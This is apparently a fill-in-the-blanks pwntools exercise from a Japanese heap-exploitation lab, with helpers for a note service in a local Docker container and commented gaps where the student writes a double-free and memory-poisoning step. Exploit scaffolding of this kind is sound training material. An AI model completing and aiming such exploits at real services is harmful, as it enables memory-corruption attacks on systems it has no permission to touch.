#!/usr/bin/python3
#-*-coding:utf-8-*-

from pwn import *
context.arch = 'amd64'


############## Utils #################
def menu():
  _  = s.readuntil('1: create note')
  _ += s.readuntil('2: delete note')
  _ += s.readuntil('3: exit')
  _ += s.readuntil('Command >> ')
  #print(_)
  return;

def create_note(size, data):
  s.sendline('1')                    # Command >> 1 ; 1. create noteをメニュー選択
  s.recvuntil('[*] Note data size:') # プロンプト読み取り
  s.sendline(str(size))              # Note data sizeを指定
  s.recvuntil('[*] Note data: ')     # プロンプト読み取り
  s.sendline(data)                   # 実際にデータを送る. 
  # 格納したノートのインデックスを読み取り, 整数データとして返す. 
  idx = s.recvline().strip().decode().split(':')[-1] 
  idx = int(idx)
  menu()
  return idx

  
def delete_note(idx):
  s.sendline('2')                    # Command >> 2; 2. delete noteをメニュー選択
  s.recvuntil('[+] Note index: ')
  s.sendline(str(idx))               # 削除したいノートのインデックスを引数に指定 
  menu()
  return 
  

# docker exec -it handson bash --> ifconfigで適宜書き換える
HOST, PORT = '172.17.0.2', 1337 
s = remote(HOST, PORT) # socat越しにExploitするときに使う
#s = process("handson1")
menu()

A = create_note(0x10, b'A' * 0x0f)

## ここでdouble-freeを作る. ノートAを2回free 


## ここまで

input('GDB?') ## デバッグ確認用: docker内コンソールから gdb -p $(pidof handson1)

## 2回mallocして, 汚染したメモリを返させる. 
###  (メモリに整数値を書き込むときはp64(<書き込みたい整数値>)を使うと良いです.)


## ここまで. 
# input('GDB?') ## デバッグ確認用: docker内コンソールから gdb -p $(pidof handson1)

## 返してきたアドレスに書き込みに行って, SIGSEGV 
create_note(0x10, b'SIGSEGV')
# s.interactive() 
